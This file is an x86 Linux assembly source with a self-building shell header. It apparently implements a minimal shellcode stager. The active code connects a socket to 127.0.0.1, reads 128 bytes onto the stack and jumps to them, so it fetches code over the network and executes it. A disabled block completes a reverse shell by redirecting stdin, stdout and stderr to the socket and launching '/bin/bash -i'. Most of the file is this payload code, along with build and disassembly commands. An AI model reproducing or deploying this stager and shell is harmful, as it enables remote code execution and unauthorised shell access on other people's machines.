%if 0

OUT=reverse.com
OUT=reverse
set -e
#set -o pipefail
if [ -n "${FULL-}" ]; then
	rm -f $OUT $OUT.o
	nasm -g -I asmlib/ -f elf32 -o $OUT.o "$0" "$@" 2>&1 | grep -vF ': ... from macro '
	FLAGS=
	ld $FLAGS -m elf_i386 -z noseparate-code $OUT.o -o $OUT
	cp $OUT $OUT.full
	ls -l $OUT.full
	sstrip -z $OUT
else
	rm -f $OUT
	nasm -I asmlib/ -f bin -o $OUT "$0" "$@" 2>&1 | grep -vF ': ... from macro '
fi
ls -l $OUT
chmod +x $OUT

#DUMP="--no-addresses -Mintel"
DUMP="-Mintel"
#DUMP="--no-addresses -Mintel"
if [ -n "${FULL-}" ]; then
	#objdump --visualize-jumps=color -d $OUT.full
	objdump $DUMP -d $OUT.full
else
	OFF=$(  readelf2 -lW $OUT 2>/dev/null | awk '$2=="0x000000"{print $3}')
	#OFF="0x10000"
	START=$(readelf2 -hW $OUT 2>/dev/null | awk '$1=="Entry"{print $4}')
	objdump $DUMP -b binary -m i386 -D $OUT --adjust-vma="$OFF" --start-address="$START"
	#objdump --visualize-jumps=color -b binary -m i386 -D $OUT --adjust-vma="$OFF" --start-address="$START"
fi

set +e
ls -l $OUT
#strace -E_=com -frni ./$OUT
echo ret $?
exit

%endif

%define REG_OPT		1
%define REG_SEARCH	1
%define REG_ASSERT	0
%define LINCOM		0

;org 0x10000
%include "stdlib.mac"
;BASE 0x3d909000

ELF 
rinit
;envp	ebp
;mov	edi, [ebp]
;taint	edi
;puts	edi
%if ELF_CUSTOM
	BASE	0x3d67b000
	mov	ah, 1
	rset    eax, SYS_socket
%endif
;add     eax, SYS_socket - 255
socket:
ychg	eax, esi
;rdump
;rset	eax, -2
set	ebx, AF_INET
set	ecx, SOCK_STREAM

;set	ebx, SYS_dup2
mov	al, 34
ELF_PHDR 1, 0x35
puship	127,0,0,1
push	eax
taint	eax
reg
;mov	eax, esi
socket	AF_INET, SOCK_STREAM, IPPROTO_IP
;mov	bl, 0x6a
;mov	bh, 1
%define	SOCKET ebx
ychg	eax, SOCKET
;rset	ebx, SYS_connect
;rset	eax, SYS_connect
;envp	ebp
;set	ebx, 2
;mov	ecx, ebx
;rset	ecx, 2
lea	eax, [esi+SYS_connect-SYS_socket]
rset	eax, SYS_connect

connect:
connect	SOCKET, esp, 16
;connect	SOCKET, 127,0,0,1, 256
rdump
rset	eax, 0

;enter	1024, 0
;taint	ebp
alloca	128

rdump
read	SOCKET, esp, 128
rdump
rset	eax, -2
;rset	eax, -1
reg

jmp	esp
%if 0
	%assign	stack_offset	128+8 ; alloca plus sockaddr struct
	mov	esi, [esp+stack_offset]
	reg
	lea     esi, [esp+4*esi+8+stack_offset]
	reg
	taint	esi
	;mov	edx, [esi]
	;taint	edx

	;puts	edx
	exit

%endif

%if 0
envp_:
	%assign	stack_offset	128+8 ; alloca plus sockaddr struct
	lea	edi, [esp+stack_offset]
	mov	edx, [edi]
	;mov	edx, [esp+stack_offset]
	reg
	;lea     edx, [esp+4*edx+8+stack_offset]
	lea     edx, [4*edx+8+edi]
	taint	edx

	dup_:
	dup2	SOCKET, 0
	rset	eax, 0
	dup2	SOCKET, 1
	rset	eax, 1
	dup2	SOCKET, 2
	rset	eax, 2

	execprep:
	push	`-i\0\0`
	set     eax, esp
	taint   eax

	push	`h\0\0\0`
	push	`/bas`
	push	`/bin`

	set     ebx, esp
	push0
	push	eax
	push    ebx

	execve:
	execve	ebx, esp, edx
%endif

%include "regdump2.mac"
